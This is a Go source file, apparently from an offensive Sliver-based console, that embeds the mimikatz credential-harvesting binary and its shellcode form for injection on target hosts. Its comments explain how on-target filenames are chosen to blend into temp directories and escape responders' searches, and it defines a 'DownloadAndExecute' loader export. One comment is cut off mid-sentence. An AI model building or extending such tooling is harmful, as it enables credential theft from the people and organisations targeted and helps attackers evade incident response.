// Package embed carries the credential-harvesting payload alongside the server.
//
// Unlike the Sliver server payload next door, this one is embedded in every
// build, release or development. The server payload is ~200 MB compressed and is
// only worth carrying when the launcher is meant to be self-contained; mimikatz
// is 1.3 MB, and a development build that could not harvest credentials would be
// missing the one feature an operator reaches for most often.
package embed

import _ "embed"

// Mimikatz is the Windows x64 mimikatz executable, embedded verbatim.
//
// It is shipped inside the console rather than fetched or asked for because
// requiring the operator to supply a path turned a single click into a
// three-step manual procedure (find a build, upload it, then run it), and the
// path field made it easy to point at a stale copy on the target. The console
// already knows which binary it wants; it should just use it.
//
//go:embed mimikatz/mimikatz.x64.exe
var Mimikatz []byte

// MimikatzShellcode is the donut-generated shellcode form of the embedded
// mimikatz executable, or nil when the build did not produce one.
//
// It exists because an EXE cannot be reflectively loaded: it has no export
// table and its entry point assumes it owns the process, so nothing inside
// Sliver can turn it into something injectable. Donut does that conversion
// offline (build/build-mimikatz-shellcode.ps1), and this is where the result is
// carried.
//
// Nil is a supported state, not an error: a build without donut still ships a
// working console, and the in-memory path reports that it has no blob rather
// than failing at the moment an operator needs credentials.
//
// Declared in the build-tagged files next to this one, because a //go:embed of
// a file the build did not generate is a compile error -- the tag is what makes
// the blob optional instead of mandatory.
// MimikatzName is the filename written to the target. It is deliberately not
// "mimikatz.exe": the point of uploading to a temp directory is to look like
// whatever else is in a temp directory, and a file named after the tool is the
const MimikatzName = "mimi.x64.exe"

// MimikatzDLLName is the on-target name used only when the binary has to be
// staged as a file for the in-memory path, on a host whose server cannot do the
// DLL-to-shellcode conversion for us.
//
// It deliberately carries the .dll extension the reflective loader expects, and
// keeps the same innocuous "mimi" stem as MimikatzName: the point of the temp
// directory is to blend in, and a file named after the tool is the first thing a
// responder greps for.
const MimikatzDLLName = "mimi.x64.dll"

// MimikatzRDIExport is the DLL export that sRDI resolves by hash and calls. It
// must match the refective loader embedded in this build; a different export
// name produces a DLL that loads successfully and does nothing.
const MimikatzRDIExport = "DownloadAndExecute"
